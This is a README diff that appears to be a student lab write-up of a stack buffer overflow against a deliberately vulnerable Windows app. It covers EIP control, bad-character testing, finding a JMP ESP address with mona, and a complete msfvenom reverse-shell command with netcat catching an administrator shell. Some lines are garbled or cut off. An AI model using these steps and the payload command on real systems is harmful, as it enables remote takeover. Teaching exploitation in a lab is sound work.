@@ -146,13 +146,88 @@ In this case it found an offset of 2003 bytes [Figure 2.4]. This is critical as 
 
 
 ## Overwriting and Controlling the EIP
+To gain control of the EIP, another python script is run to send a custom buffer to the VulnApp application. The script below [Figure 3.1] will be using a new variable shellcode which is assigned a string of 2003 character A’s (2003 as this is the number of bytes before the EIP) plus 4 character B’s(To clearly define the EIP’s 4 bytes
+
+
+When the script is run and the VulnApp application crashes, looking at the registers on immunity shows the TRUN Command and the A’s, on the EBP the A’s in hex format 414141 and on the EIP the B’s in hex format 424242 [Figure 3.2]. The EIP is overwritten and can be used to point to malicious code
+
+
+## Identifying Bad Characters
+When generating shellcodes, it is necessary to find and remove the possibility of bad characters interfering with the shellcode. These characters are used by the VulnApp application so if passed to the program through the shellcode, VulnApp will consider it as something else and the shellcode will not run.
+By running all the hex characters through the VulnApp program and seeing the effects on the program, these bad characters can be determined.
+
+
+
+Running the above script with the null byte value included [Figure 4.1] will send the payload with the bad characters. Below is the Hex dump after the application crashes [Figure 4.2] [Figure4.3], any values missing or out of order will be a bad character and should be excluded from shellcode. In this case the only bad character is \x00,\x,\x
+
+
+
+
+## IIdentifying The Right Module
+To identify the right vulnerable module in the application’s library, another python script will be used to find a .dll file linked to VulnApp that has no memory protections. The mona module is a tool that can be used with immunity debugger to achieve this. This module, as seen below, is already attached to the immunity debugger Py Commands folder [Figure 5.1].
+
+
+
+With Immunity running and the VulnApp.exe attaced and loaded and using the command “!mona module” at the bottom of the debugger screen will display all the availaible dll’s. The essfunc.dll module with address is selected as it has all its memory protections set to false, is linked to vulnApp and has no return value[Figure 5.2]
+
+
+
+The jump command in assembly language is going to be used as a pointer to jump to the malicious code but the operation code equivalent of the command must be used. To do this the ruby script nasm_shell is used to convert the assembly language JMP ESP into hex FFE4 [Figure 5.3].
+
+
+
+On immunity Debugger, mona is run again but this time with the command “!mona find -s “\xff\xe4” -m essfunc.dll”. The \xff\xe4 is opcode for JMP ESP .The displayed items are the return addresses linked to the essfunc.dll and lists all its memory protections [Figure5.4].These return addresses are pushed onto the stack when the dll is called and is where the shellcode will be stored.
+
+The address of the 1st item displayed on immunity is added into the script as shown below [Figure 5.5]. 
+
+
+
+The 4 B’s used to find the EIP have been replaced with the pointer 625011af in little endian format. This will make the EIP a JMP code which can point to a malicious code. This jump point can be caught on Immunity by setting a breakpoint using the pointer (625011af) [Figure 5.6] and running the script. 
+With the breakpoint set, when the buffer is overflowed but hits the specific spot in which the breakpoint is set, it will not jump but rather crash the VulnApp application, pause and await further instructions from the attacker [Figure 5.7].
+
+
+
+## Generating The Shellcode
+To generate a shellcode, the tool msfvenom by Metasploit will be used to generate the payload. Using:
+msfvenom -p windows/shell_reverse_tcp LHOST=”192.168.56.106” LPORT=49152 EXITFUNC=thread -f c -a x86 -b “\x00”
+where -p is the payload
+windows/ sets payload to windows
+/shell_reverse_tcp is a non-staged reverse shell that allows the victim machine to connect back to target machine.
+LHOST and LPORT attack machine address
+EXITFUNC=thread makes exploit stable
+-f is for the filetype
+c is to export to C language
+-a is to select architecture type, in this case it’s an x86 PC
+-b is for bad characters.
+
+When that completes running, a shell code will be generated and added to a new python script. [Figure 6.1]. 
+
+
+
+In the script above, a variable bufferOverflow is declared and assigned the generated shell code copied from msfvenom. The shellcode variable still holds the string of 2003 character A’s plus the pointer address, which is the JMP address, and the new variable bufferOverflow which holds the shellcode. Nops (No-Operation) are included to provide padding between the JMP command and the overflow variable to prevent any instances where command execution doesn’t take place.
+
+Before running this script, a netcat connection to VulnApp is opened so the attacking machine can listen on the port. 
+
+When the shellScript4.py script runs, the shellcode will execute and connect to the Windows machine, allowing full access control since the vulnerable program was executed as an administrator [Figure6.2].
+
+
+
+
+
+
+
 
 <!-- ROADMAP -->
-## Roadmap
-
-See the [open issues](https://github.com/othneildrew/Best-README-Template/issues) for a list of proposed features (and known issues).
-
-
+## Appendices
+Definitions:
+1.	The Extended Instruction Pointer (EIP) is a register that contains the address of the next instruction for the program or command. Can be seen on the immunity Debugger
+2.	The Extended Stack Pointer (ESP) is a register that lets you know where on the stack you are and allows you to push data in and out of the application. Can be seen on the immunity Debugger
+3.	The Jump (JMP) is an instruction that modifies the flow of execution where the operand designated will contain the address being jumped to.
+4.	\x41, \x42, - The hexadecimal values for A and B.
+5.	Buffer is a temporary area in memory which can hold the values of a program in between execution process.
+6.	Buffer Overflow attack is the process of exceeding buffer boundaries using input data and overwriting any adjacent memory locations to conduct malicious intents.
+7.	
+Anatomy of a Stack:
 
 <!-- CONTRIBUTING -->
 ## Contributing
@@ -165,8 +240,6 @@ Contributions are what make the open source community such an amazing place to b
 4. Push to the Branch (`git push origin feature/AmazingFeature`)
 5. Open a Pull Request
 
-
-
 <!-- LICENSE -->
 ## License
 
@@ -177,9 +250,9 @@ Distributed under the MIT License. See `LICENSE` for more information.
 <!-- CONTACT -->
 ## Contact
 
-Your Name - [@your_twitter](https://twitter.com/your_username) - email@example.com
+Akolade Sylvester Adelaja - [https://github.com/kayrrtolkien/Kayrrtolkien](https://github.com/kayrrtolkien/Kayrrtolkien)
 
-Project Link: [https://github.com/your_username/repo_name](https://github.com/your_username/repo_name)
+Project Link: [https://github.com/kayrrtolkien/BufferOverflow/edit/master/README.md](https://github.com/kayrrtolkien/BufferOverflow/edit/master/README.md)
 
 
 
@@ -213,4 +286,3 @@ Project Link: [https://github.com/your_username/repo_name](https://github.com/yo
 [license-url]: https://github.com/othneildrew/Best-README-Template/blob/master/LICENSE.txt
 [linkedin-shield]: https://img.shields.io/badge/-LinkedIn-black.svg?style=for-the-badge&logo=linkedin&colorB=555
 [linkedin-url]: https://www.linkedin.com/in/sylvester-a-adelaja-954918124/
-[product-screenshot]: images/2021-02-22 20_33_43-Adelaja_Akolade_Buffer_Overflow_Report.docx - Word.png
